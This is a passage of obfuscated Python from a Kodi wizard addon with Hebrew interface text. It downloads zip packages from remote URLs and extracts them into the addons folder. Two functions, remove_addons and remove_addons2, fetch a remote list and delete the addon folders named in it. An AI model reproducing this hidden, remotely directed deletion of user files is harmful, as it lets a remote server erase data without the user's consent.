							wiz .log ("[Notifications] id: %s"%str (O0O000O0O0OOO0OO0 ),xbmc .LOGNOTICE )#line:5125
							wiz .setS ('noteid',str (O0O000O0O0OOO0OO0 ))#line:5126
							wiz .setS ("notedismiss","true")#line:5127
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5130
					except Exception as O000O00000O0OO00O :#line:5131
						wiz .log ("Error on Notifications Window: %s"%str (O000O00000O0OO00O ),xbmc .LOGERROR )#line:5132
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5134
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OOOO0OOO0O0O0O000 ),xbmc .LOGNOTICE )#line:5135
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5136
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5137
def checkidupdate ():#line:5143
				wiz .setS ("notedismiss","true")#line:5145
				O00OO00OO0O0OO0O0 =wiz .workingURL (NOTIFICATION )#line:5146
				O0000O0000O00O0O0 =" Kodi Premium"#line:5148
				O00OO00OOO0O0O0O0 =wiz .checkBuild (O0000O0000O00O0O0 ,'gui')#line:5149
				O00O0OOO0O0000OO0 =O0000O0000O00O0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5150
				if not wiz .workingURL (O00OO00OOO0O0O0O0 )==True :return #line:5151
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5152
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0000O0000O00O0O0 ),'','אנא המתן')#line:5153
				O0OOOO00O0OO0O0O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O0OOO0O0000OO0 )#line:5154
				try :os .remove (O0OOOO00O0OO0O0O0 )#line:5155
				except :pass #line:5156
				logging .warning (O00OO00OOO0O0O0O0 )#line:5157
				if 'google'in O00OO00OOO0O0O0O0 :#line:5158
				   O0O00OOOO00OOOOOO =googledrive_download (O00OO00OOO0O0O0O0 ,O0OOOO00O0OO0O0O0 ,DP ,wiz .checkBuild (O0000O0000O00O0O0 ,'filesize'))#line:5159
				else :#line:5162
				  downloader .download (O00OO00OOO0O0O0O0 ,O0OOOO00O0OO0O0O0 ,DP )#line:5163
				xbmc .sleep (100 )#line:5164
				OOOOOO0O000OOO00O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O0000O00O0O0 )#line:5165
				DP .update (0 ,OOOOOO0O000OOO00O ,'','אנא המתן')#line:5166
				extract .all (O0OOOO00O0OO0O0O0 ,HOME ,DP ,title =OOOOOO0O000OOO00O )#line:5167
				DP .close ()#line:5168
				wiz .defaultSkin ()#line:5169
				wiz .lookandFeelData ('save')#line:5170
				if KODIV >=18 :#line:5171
					skindialogsettind18 ()#line:5172
				if INSTALLMETHOD ==1 :OOO00OOOO0O00OO0O =1 #line:5175
				elif INSTALLMETHOD ==2 :OOO00OOOO0O00OO0O =0 #line:5176
				else :DP .close ()#line:5177
def gaiaserenaddon ():#line:5179
  O00O00OO00O0OO0O0 =(ADDON .getSetting ("gaiaseren"))#line:5180
  O000OO000OO00O000 =(ADDON .getSetting ("auto_rd"))#line:5181
  if O00O00OO00O0OO0O0 =='true'and O000OO000OO00O000 =='true':#line:5182
    O000O00OOO000OOOO =(NEWFASTUPDATE )#line:5183
    O00O0O0000O00OOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5184
    O00OO0OOO0O0OOOOO =xbmcgui .DialogProgress ()#line:5185
    O00OO0OOO0O0OOOOO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5186
    OOOOOOO00O0O00OO0 =os .path .join (PACKAGES ,'isr.zip')#line:5187
    O0000000OOOO00OO0 =urllib2 .Request (O000O00OOO000OOOO )#line:5188
    OOO0O00OO00O0000O =urllib2 .urlopen (O0000000OOOO00OO0 )#line:5189
    O00OO0OO000OOOO00 =xbmcgui .DialogProgress ()#line:5191
    O00OO0OO000OOOO00 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5192
    O00OO0OO000OOOO00 .update (0 )#line:5193
    O000O0OO000OOOOOO =open (OOOOOOO00O0O00OO0 ,'wb')#line:5195
    try :#line:5197
      O0OOO0O00O00OO0O0 =OOO0O00OO00O0000O .info ().getheader ('Content-Length').strip ()#line:5198
      O0OOO0O0O0OOOO0OO =True #line:5199
    except AttributeError :#line:5200
          O0OOO0O0O0OOOO0OO =False #line:5201
    if O0OOO0O0O0OOOO0OO :#line:5203
          O0OOO0O00O00OO0O0 =int (O0OOO0O00O00OO0O0 )#line:5204
    OOO0OO0OO0O00OOOO =0 #line:5206
    OO0O0O00000O0O00O =time .time ()#line:5207
    while True :#line:5208
          O0000OO0OO0OO0000 =OOO0O00OO00O0000O .read (8192 )#line:5209
          if not O0000OO0OO0OO0000 :#line:5210
              sys .stdout .write ('\n')#line:5211
              break #line:5212
          OOO0OO0OO0O00OOOO +=len (O0000OO0OO0OO0000 )#line:5214
          O000O0OO000OOOOOO .write (O0000OO0OO0OO0000 )#line:5215
          if not O0OOO0O0O0OOOO0OO :#line:5217
              O0OOO0O00O00OO0O0 =OOO0OO0OO0O00OOOO #line:5218
          if O00OO0OO000OOOO00 .iscanceled ():#line:5219
             O00OO0OO000OOOO00 .close ()#line:5220
             try :#line:5221
              os .remove (OOOOOOO00O0O00OO0 )#line:5222
             except :#line:5223
              pass #line:5224
             break #line:5225
          O00000000000O0OOO =float (OOO0OO0OO0O00OOOO )/O0OOO0O00O00OO0O0 #line:5226
          O00000000000O0OOO =round (O00000000000O0OOO *100 ,2 )#line:5227
          OOOOOO000OOOOO00O =OOO0OO0OO0O00OOOO /(1024 *1024 )#line:5228
          O000000O0OOOO00OO =O0OOO0O00O00OO0O0 /(1024 *1024 )#line:5229
          OO0O000O0O00O0OOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOOO000OOOOO00O ,'teal',O000000O0OOOO00OO )#line:5230
          if (time .time ()-OO0O0O00000O0O00O )>0 :#line:5231
            OOO0OOOOO0O00OO0O =OOO0OO0OO0O00OOOO /(time .time ()-OO0O0O00000O0O00O )#line:5232
            OOO0OOOOO0O00OO0O =OOO0OOOOO0O00OO0O /1024 #line:5233
          else :#line:5234
           OOO0OOOOO0O00OO0O =0 #line:5235
          O0O000OOOOOO0O000 ='KB'#line:5236
          if OOO0OOOOO0O00OO0O >=1024 :#line:5237
             OOO0OOOOO0O00OO0O =OOO0OOOOO0O00OO0O /1024 #line:5238
             O0O000OOOOOO0O000 ='MB'#line:5239
          if OOO0OOOOO0O00OO0O >0 and not O00000000000O0OOO ==100 :#line:5240
              O00O000OO000O0O0O =(O0OOO0O00O00OO0O0 -OOO0OO0OO0O00OOOO )/OOO0OOOOO0O00OO0O #line:5241
          else :#line:5242
              O00O000OO000O0O0O =0 #line:5243
          O0OOOOOO0O00O0O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0OOOOO0O00OO0O ,O0O000OOOOOO0O000 )#line:5244
          O00OO0OO000OOOO00 .update (int (O00000000000O0OOO ),OO0O000O0O00O0OOO ,O0OOOOOO0O00O0O00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5246
    OOOO00OO0O000O00O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5249
    O000O0OO000OOOOOO .close ()#line:5252
    extract .all (OOOOOOO00O0O00OO0 ,OOOO00OO0O000O00O ,O00OO0OO000OOOO00 )#line:5253
    try :#line:5257
      os .remove (OOOOOOO00O0O00OO0 )#line:5258
    except :#line:5259
      pass #line:5260
def iptvsimpldownpc ():#line:5261
    O000OO0OOO0O0OO0O =(IPTVSIMPL18PC )#line:5263
    O00OO0O0OOOO00OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5264
    OO00OO00OOO0OOOOO =xbmcgui .DialogProgress ()#line:5265
    OO00OO00OOO0OOOOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5266
    OO00O00OO000OO000 =os .path .join (PACKAGES ,'isr.zip')#line:5267
    OO0OO0OO0OO0O0000 =urllib2 .Request (O000OO0OOO0O0OO0O )#line:5268
    O0OOO00O00O000OO0 =urllib2 .urlopen (OO0OO0OO0OO0O0000 )#line:5269
    O0OOOO0O000O0OO0O =xbmcgui .DialogProgress ()#line:5271
    O0OOOO0O000O0OO0O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5272
    O0OOOO0O000O0OO0O .update (0 )#line:5273
    OOOO00OO0O0OOOO00 =open (OO00O00OO000OO000 ,'wb')#line:5275
    try :#line:5277
      OOO0O00OO0OOO0O0O =O0OOO00O00O000OO0 .info ().getheader ('Content-Length').strip ()#line:5278
      OOOOOOOO0000OO000 =True #line:5279
    except AttributeError :#line:5280
          OOOOOOOO0000OO000 =False #line:5281
    if OOOOOOOO0000OO000 :#line:5283
          OOO0O00OO0OOO0O0O =int (OOO0O00OO0OOO0O0O )#line:5284
    OO0OOOOOOO0O0O00O =0 #line:5286
    OO00O00O0OO00OOOO =time .time ()#line:5287
    while True :#line:5288
          OOOOOO0O000000OOO =O0OOO00O00O000OO0 .read (8192 )#line:5289
          if not OOOOOO0O000000OOO :#line:5290
              sys .stdout .write ('\n')#line:5291
              break #line:5292
          OO0OOOOOOO0O0O00O +=len (OOOOOO0O000000OOO )#line:5294
          OOOO00OO0O0OOOO00 .write (OOOOOO0O000000OOO )#line:5295
          if not OOOOOOOO0000OO000 :#line:5297
              OOO0O00OO0OOO0O0O =OO0OOOOOOO0O0O00O #line:5298
          if O0OOOO0O000O0OO0O .iscanceled ():#line:5299
             O0OOOO0O000O0OO0O .close ()#line:5300
             try :#line:5301
              os .remove (OO00O00OO000OO000 )#line:5302
             except :#line:5303
              pass #line:5304
             break #line:5305
          OO0OOOO0OOO0000O0 =float (OO0OOOOOOO0O0O00O )/OOO0O00OO0OOO0O0O #line:5306
          OO0OOOO0OOO0000O0 =round (OO0OOOO0OOO0000O0 *100 ,2 )#line:5307
          OOO0O00OOOOOOOOO0 =OO0OOOOOOO0O0O00O /(1024 *1024 )#line:5308
          O00OOO0OOOOOOO0OO =OOO0O00OO0OOO0O0O /(1024 *1024 )#line:5309
          OOO00O000OO0O0O00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO0O00OOOOOOOOO0 ,'teal',O00OOO0OOOOOOO0OO )#line:5310
          if (time .time ()-OO00O00O0OO00OOOO )>0 :#line:5311
            OO00OO0OOOOOO0OO0 =OO0OOOOOOO0O0O00O /(time .time ()-OO00O00O0OO00OOOO )#line:5312
            OO00OO0OOOOOO0OO0 =OO00OO0OOOOOO0OO0 /1024 #line:5313
          else :#line:5314
           OO00OO0OOOOOO0OO0 =0 #line:5315
          OO00O00O000OO00OO ='KB'#line:5316
          if OO00OO0OOOOOO0OO0 >=1024 :#line:5317
             OO00OO0OOOOOO0OO0 =OO00OO0OOOOOO0OO0 /1024 #line:5318
             OO00O00O000OO00OO ='MB'#line:5319
          if OO00OO0OOOOOO0OO0 >0 and not OO0OOOO0OOO0000O0 ==100 :#line:5320
              OO0OOO00OO00OOO00 =(OOO0O00OO0OOO0O0O -OO0OOOOOOO0O0O00O )/OO00OO0OOOOOO0OO0 #line:5321
          else :#line:5322
              OO0OOO00OO00OOO00 =0 #line:5323
          O0OOO0OOOOOO0OO00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00OO0OOOOOO0OO0 ,OO00O00O000OO00OO )#line:5324
          O0OOOO0O000O0OO0O .update (int (OO0OOOO0OOO0000O0 ),OOO00O000OO0O0O00 ,O0OOO0OOOOOO0OO00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5326
    OOOOO0O000O0OO000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5329
    OOOO00OO0O0OOOO00 .close ()#line:5332
    extract .all (OO00O00OO000OO000 ,OOOOO0O000O0OO000 ,O0OOOO0O000O0OO0O )#line:5333
    try :#line:5337
      os .remove (OO00O00OO000OO000 )#line:5338
    except :#line:5339
      pass #line:5340
def iptvsimpldown ():#line:5341
    O00OOOO0OOOO0O0OO =(IPTV18 )#line:5343
    O0OOO00OO00OOOOOO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5344
    OO0OOO0OO0000OOOO =xbmcgui .DialogProgress ()#line:5345
    OO0OOO0OO0000OOOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5346
    OOOO0O00OOOOO00OO =os .path .join (PACKAGES ,'isr.zip')#line:5347
    OOOO0OOO000O000O0 =urllib2 .Request (O00OOOO0OOOO0O0OO )#line:5348
    O0000O0O0O000O000 =urllib2 .urlopen (OOOO0OOO000O000O0 )#line:5349
    OO00O00000O0OO0OO =xbmcgui .DialogProgress ()#line:5351
    OO00O00000O0OO0OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5352
    OO00O00000O0OO0OO .update (0 )#line:5353
    O0OO0OO0O00O0O00O =open (OOOO0O00OOOOO00OO ,'wb')#line:5355
    try :#line:5357
      O0O0OOOO0O0O0000O =O0000O0O0O000O000 .info ().getheader ('Content-Length').strip ()#line:5358
      O0O000O0O0OO0000O =True #line:5359
    except AttributeError :#line:5360
          O0O000O0O0OO0000O =False #line:5361
    if O0O000O0O0OO0000O :#line:5363
          O0O0OOOO0O0O0000O =int (O0O0OOOO0O0O0000O )#line:5364
    OO0OOO00O000OOOO0 =0 #line:5366
    O0OO000OOO000000O =time .time ()#line:5367
    while True :#line:5368
          OOOOO0OO0000O0OOO =O0000O0O0O000O000 .read (8192 )#line:5369
          if not OOOOO0OO0000O0OOO :#line:5370
              sys .stdout .write ('\n')#line:5371
              break #line:5372
          OO0OOO00O000OOOO0 +=len (OOOOO0OO0000O0OOO )#line:5374
          O0OO0OO0O00O0O00O .write (OOOOO0OO0000O0OOO )#line:5375
          if not O0O000O0O0OO0000O :#line:5377
              O0O0OOOO0O0O0000O =OO0OOO00O000OOOO0 #line:5378
          if OO00O00000O0OO0OO .iscanceled ():#line:5379
             OO00O00000O0OO0OO .close ()#line:5380
             try :#line:5381
              os .remove (OOOO0O00OOOOO00OO )#line:5382
             except :#line:5383
              pass #line:5384
             break #line:5385
          O0O0O0OOOO00000OO =float (OO0OOO00O000OOOO0 )/O0O0OOOO0O0O0000O #line:5386
          O0O0O0OOOO00000OO =round (O0O0O0OOOO00000OO *100 ,2 )#line:5387
          OO00OO0OOO0OO00O0 =OO0OOO00O000OOOO0 /(1024 *1024 )#line:5388
          O0OOO000OOOO00O0O =O0O0OOOO0O0O0000O /(1024 *1024 )#line:5389
          O0OOO0OO0O00O000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00OO0OOO0OO00O0 ,'teal',O0OOO000OOOO00O0O )#line:5390
          if (time .time ()-O0OO000OOO000000O )>0 :#line:5391
            OO00000O000O00000 =OO0OOO00O000OOOO0 /(time .time ()-O0OO000OOO000000O )#line:5392
            OO00000O000O00000 =OO00000O000O00000 /1024 #line:5393
          else :#line:5394
           OO00000O000O00000 =0 #line:5395
          OOO00OO00O00O000O ='KB'#line:5396
          if OO00000O000O00000 >=1024 :#line:5397
             OO00000O000O00000 =OO00000O000O00000 /1024 #line:5398
             OOO00OO00O00O000O ='MB'#line:5399
          if OO00000O000O00000 >0 and not O0O0O0OOOO00000OO ==100 :#line:5400
              O000OO0O0OOOOO0OO =(O0O0OOOO0O0O0000O -OO0OOO00O000OOOO0 )/OO00000O000O00000 #line:5401
          else :#line:5402
              O000OO0O0OOOOO0OO =0 #line:5403
          O0OO0OOOO0000O0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00000O000O00000 ,OOO00OO00O00O000O )#line:5404
          OO00O00000O0OO0OO .update (int (O0O0O0OOOO00000OO ),O0OOO0OO0O00O000O ,O0OO0OOOO0000O0OO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5406
    O00O00000O0O0000O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5409
    O0OO0OO0O00O0O00O .close ()#line:5412
    extract .all (OOOO0O00OOOOO00OO ,O00O00000O0O0000O ,OO00O00000O0OO0OO )#line:5413
    try :#line:5417
      os .remove (OOOO0O00OOOOO00OO )#line:5418
    except :#line:5419
      pass #line:5420
def testnotify ():#line:5421
	O00000O000O0OOO00 =wiz .workingURL (NOTIFICATION )#line:5422
	if O00000O000O0OOO00 ==True :#line:5423
		try :#line:5424
			OOOOO0OOO0000OO00 ,O00OO0O0000O0000O =wiz .splitNotify (NOTIFICATION )#line:5425
			if OOOOO0OOO0000OO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5426
			if STARTP2 ()=='ok':#line:5427
				notify .notification (O00OO0O0000O0000O ,True )#line:5428
		except Exception as O0000OOO0O000OOO0 :#line:5429
			wiz .log ("Error on Notifications Window: %s"%str (O0000OOO0O000OOO0 ),xbmc .LOGERROR )#line:5430
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5431
def testnotify2 ():#line:5432
	OOOO0O0O0O000OOOO =wiz .workingURL (NOTIFICATION2 )#line:5433
	if OOOO0O0O0O000OOOO ==True :#line:5434
		try :#line:5435
			OO0O0OO0O00OO0OO0 ,O000OOOO0O000O0OO =wiz .splitNotify (NOTIFICATION2 )#line:5436
			if OO0O0OO0O00OO0OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5437
			if STARTP2 ()=='ok':#line:5438
				notify .notification2 (O000OOOO0O000O0OO ,True )#line:5439
		except Exception as O00O00O000OOOO000 :#line:5440
			wiz .log ("Error on Notifications Window: %s"%str (O00O00O000OOOO000 ),xbmc .LOGERROR )#line:5441
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5442
def testnotify3 ():#line:5443
	O0OO0O0OOO0O0OOOO =wiz .workingURL (NOTIFICATION3 )#line:5444
	if O0OO0O0OOO0O0OOOO ==True :#line:5445
		try :#line:5446
			OO0OOOO0OO0OO0000 ,OOO00O00OOO0OO0O0 =wiz .splitNotify (NOTIFICATION3 )#line:5447
			if OO0OOOO0OO0OO0000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5448
			if STARTP2 ()=='ok':#line:5449
				notify .notification3 (OOO00O00OOO0OO0O0 ,True )#line:5450
		except Exception as O0O0O000000000O0O :#line:5451
			wiz .log ("Error on Notifications Window: %s"%str (O0O0O000000000O0O ),xbmc .LOGERROR )#line:5452
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5453
def servicemanual ():#line:5454
	O0000O0OOOO00O0O0 =wiz .workingURL (HELPINFO )#line:5455
	if O0000O0OOOO00O0O0 ==True :#line:5456
		try :#line:5457
			OO0000O0O000O000O ,OOOO0OO0O00OO00O0 =wiz .splitNotify (HELPINFO )#line:5458
			if OO0000O0O000O000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5459
			notify .helpinfo (OOOO0OO0O00OO00O0 ,True )#line:5460
		except Exception as OOO00O0OO0O00O0OO :#line:5461
			wiz .log ("Error on Notifications Window: %s"%str (OOO00O0OO0O00O0OO ),xbmc .LOGERROR )#line:5462
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5463
def testupdate ():#line:5465
	if BUILDNAME =="":#line:5466
		notify .updateWindow ()#line:5467
	else :#line:5468
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5469
def testfirst ():#line:5471
	notify .firstRun ()#line:5472
def testfirstRun ():#line:5474
	notify .firstRunSettings ()#line:5475
def fastinstall ():#line:5478
	notify .firstRuninstall ()#line:5479
def addDir (OOO00OO000O00OOO0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5486
	OOO0000O0000O000O =sys .argv [0 ]#line:5487
	if not mode ==None :OOO0000O0000O000O +="?mode=%s"%urllib .quote_plus (mode )#line:5488
	if not name ==None :OOO0000O0000O000O +="&name="+urllib .quote_plus (name )#line:5489
	if not url ==None :OOO0000O0000O000O +="&url="+urllib .quote_plus (url )#line:5490
	O000O0OO00O0OO0OO =True #line:5491
	if themeit :OOO00OO000O00OOO0 =themeit %OOO00OO000O00OOO0 #line:5492
	OO0OOOO00O0O0000O =xbmcgui .ListItem (OOO00OO000O00OOO0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5493
	OO0OOOO00O0O0000O .setInfo (type ="Video",infoLabels ={"Title":OOO00OO000O00OOO0 ,"Plot":description })#line:5494
	OO0OOOO00O0O0000O .setProperty ("Fanart_Image",fanart )#line:5495
	if not menu ==None :OO0OOOO00O0O0000O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5496
	O000O0OO00O0OO0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO0000O0000O000O ,listitem =OO0OOOO00O0O0000O ,isFolder =True )#line:5497
	return O000O0OO00O0OO0OO #line:5498
def addFile (OO0000OOO00O0O00O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5500
	O0OOOOOOOO0O00OOO =sys .argv [0 ]#line:5501
	if not mode ==None :O0OOOOOOOO0O00OOO +="?mode=%s"%urllib .quote_plus (mode )#line:5502
	if not name ==None :O0OOOOOOOO0O00OOO +="&name="+urllib .quote_plus (name )#line:5503
	if not url ==None :O0OOOOOOOO0O00OOO +="&url="+urllib .quote_plus (url )#line:5504
	OO000OO0OO0O00OO0 =True #line:5505
	if themeit :OO0000OOO00O0O00O =themeit %OO0000OOO00O0O00O #line:5506
	O0O0O0O0OO0OO0O0O =xbmcgui .ListItem (OO0000OOO00O0O00O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5507
	O0O0O0O0OO0OO0O0O .setInfo (type ="Video",infoLabels ={"Title":OO0000OOO00O0O00O ,"Plot":description })#line:5508
	O0O0O0O0OO0OO0O0O .setProperty ("Fanart_Image",fanart )#line:5509
	if not menu ==None :O0O0O0O0OO0OO0O0O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5510
	OO000OO0OO0O00OO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OOOOOOOO0O00OOO ,listitem =O0O0O0O0OO0OO0O0O ,isFolder =False )#line:5511
	return OO000OO0OO0O00OO0 #line:5512
def get_params ():#line:5514
	O0O0O0O0OOOO0OO00 =[]#line:5515
	O0OOOOO00OO00OO00 =sys .argv [2 ]#line:5516
	if len (O0OOOOO00OO00OO00 )>=2 :#line:5517
		OOO00O0O0OO00000O =sys .argv [2 ]#line:5518
		OOOO0OOOOO0OOOO00 =OOO00O0O0OO00000O .replace ('?','')#line:5519
		if (OOO00O0O0OO00000O [len (OOO00O0O0OO00000O )-1 ]=='/'):#line:5520
			OOO00O0O0OO00000O =OOO00O0O0OO00000O [0 :len (OOO00O0O0OO00000O )-2 ]#line:5521
		OOO0O0OO00O00O0O0 =OOOO0OOOOO0OOOO00 .split ('&')#line:5522
		O0O0O0O0OOOO0OO00 ={}#line:5523
		for OOOO00000OO000OOO in range (len (OOO0O0OO00O00O0O0 )):#line:5524
			OOO000OOOO0O00O00 ={}#line:5525
			OOO000OOOO0O00O00 =OOO0O0OO00O00O0O0 [OOOO00000OO000OOO ].split ('=')#line:5526
			if (len (OOO000OOOO0O00O00 ))==2 :#line:5527
				O0O0O0O0OOOO0OO00 [OOO000OOOO0O00O00 [0 ]]=OOO000OOOO0O00O00 [1 ]#line:5528
		return O0O0O0O0OOOO0OO00 #line:5530
def remove_addons ():#line:5532
	try :#line:5533
			import json #line:5534
			OOO0OO0OOO00OOO00 =urllib2 .urlopen (remove_url ).readlines ()#line:5535
			for OO0OO00OOO0O0OOOO in OOO0OO0OOO00OOO00 :#line:5536
				OOOOO0O0OOOOOO000 =OO0OO00OOO0O0OOOO .split (':')[1 ].strip ()#line:5538
				OOOO00OOO0OO00O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OOOOO0O0OOOOOO000 ,'false')#line:5539
				OO0O0OO0O0000O0OO =xbmc .executeJSONRPC (OOOO00OOO0OO00O00 )#line:5540
				O000OOO00OO0OOO0O =json .loads (OO0O0OO0O0000O0OO )#line:5541
				O00OO0O00O0OO0O00 =os .path .join (addons_folder ,OOOOO0O0OOOOOO000 )#line:5543
				if os .path .exists (O00OO0O00O0OO0O00 ):#line:5545
					for O0O0O00000OOOO0O0 ,OOOOO00OO00O0O0OO ,OOOOO0000O000O0O0 in os .walk (O00OO0O00O0OO0O00 ):#line:5546
						for OOOO00000O00OO0OO in OOOOO0000O000O0O0 :#line:5547
							os .unlink (os .path .join (O0O0O00000OOOO0O0 ,OOOO00000O00OO0OO ))#line:5548
						for OO0O0OOO0O0O00O0O in OOOOO00OO00O0O0OO :#line:5549
							shutil .rmtree (os .path .join (O0O0O00000OOOO0O0 ,OO0O0OOO0O0O00O0O ))#line:5550
					os .rmdir (O00OO0O00O0OO0O00 )#line:5551
			xbmc .executebuiltin ('Container.Refresh')#line:5553
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5554
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5555
	except :pass #line:5556
def remove_addons2 ():#line:5557
	try :#line:5558
			import json #line:5559
			O0OO00OOOO00OO0OO =urllib2 .urlopen (remove_url2 ).readlines ()#line:5560
			for O0OO0OO00O0OO000O in O0OO00OOOO00OO0OO :#line:5561
				OO00000O0OO0OO000 =O0OO0OO00O0OO000O .split (':')[1 ].strip ()#line:5563
				O00O00O0000OOOO0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OO00000O0OO0OO000 ,'false')#line:5564
				OO00000OOOOO00000 =xbmc .executeJSONRPC (O00O00O0000OOOO0O )#line:5565
				O00O0O0000OOOO0O0 =json .loads (OO00000OOOOO00000 )#line:5566
				O00O0OOO000OOO0OO =os .path .join (user_folder ,OO00000O0OO0OO000 )#line:5568
				if os .path .exists (O00O0OOO000OOO0OO ):#line:5570
					for O00O0O0O0OO0OOOO0 ,OO000O0O0OO0000OO ,OOO00O00OO00O0O0O in os .walk (O00O0OOO000OOO0OO ):#line:5571
						for O000OO0OO00000O00 in OOO00O00OO00O0O0O :#line:5572
							os .unlink (os .path .join (O00O0O0O0OO0OOOO0 ,O000OO0OO00000O00 ))#line:5573
						for OOO0OO00000O0O00O in OO000O0O0OO0000OO :#line:5574
							shutil .rmtree (os .path .join (O00O0O0O0OO0OOOO0 ,OOO0OO00000O0O00O ))#line:5575
					os .rmdir (O00O0OOO000OOO0OO )#line:5576
	except :pass #line:5578
params =get_params ()#line:5579
url =None #line:5580
name =None #line:5581
mode =None #line:5582
try :mode =urllib .unquote_plus (params ["mode"])#line:5584
except :pass #line:5585
try :name =urllib .unquote_plus (params ["name"])#line:5586
except :pass #line:5587
try :url =urllib .unquote_plus (params ["url"])#line:5588
except :pass #line:5589
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5591
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5592
def setView (OO00OOOO0OOOO00O0 ,O0O00OOO0O00O0O0O ):#line:5593
